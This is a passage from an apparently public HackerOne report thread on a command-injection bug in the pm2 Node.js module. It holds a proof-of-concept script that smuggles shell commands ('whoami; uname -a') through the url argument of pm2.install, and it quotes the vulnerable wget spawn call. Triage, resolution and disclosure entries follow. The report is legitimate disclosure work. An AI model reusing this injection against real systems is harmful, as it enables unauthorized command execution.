\u003ccode\u003eurl\u003c/code\u003e passed as an argument:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// pm2_exploit.js\u003c/span\u003e\n\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epm2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// payload - user controllable input\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp://localhost:8000/some.tar.gz;whoami;uname -a;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eapps\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{})\u003c/span\u003e \u003cspan class=\"c1\"\u003e// injection\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edisconnect\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, run exploit:\u003cbr\u003e\n\u003ccode\u003e$ node pm2_exploit.js\u003c/code\u003e\u003cbr\u003e\nand observe results in terminal window.\u003c/p\u003e\n\n\u003cp\u003eAs \u003ccode\u003eurl\u003c/code\u003e is not sanitized at all, injected command(s) are executed by this instruction:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ewget\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003espawn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ewget\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e-O\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e-q\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003estdio\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einherit\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eshell\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-02T13:33:39.640Z","updated_at":"2019-07-02T13:33:39.640Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5299021,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-11T09:05:27.419Z","updated_at":"2019-07-11T09:05:27.419Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (6.4)","old_severity_id":444953,"new_severity_id":456050},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5299040,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","markdown_message":"\u003cp\u003eI was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-11T09:12:22.848Z","updated_at":"2019-07-11T09:12:22.848Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5299287,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @beagle ,\n\nThank you for the update!\n\nCheers,\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for the update!\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-11T10:10:32.807Z","updated_at":"2019-07-11T10:10:32.807Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5876091,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-24T09:53:03.793Z","updated_at":"2019-09-24T09:53:03.793Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bl4de","url":"/bl4de"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5876092,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-24T09:53:10.610Z","updated_at":"2019-09-24T09:53:10.610Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6124046,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-24T09:53:13.876Z","updated_at":"2019-10-24T09:53:13.876Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}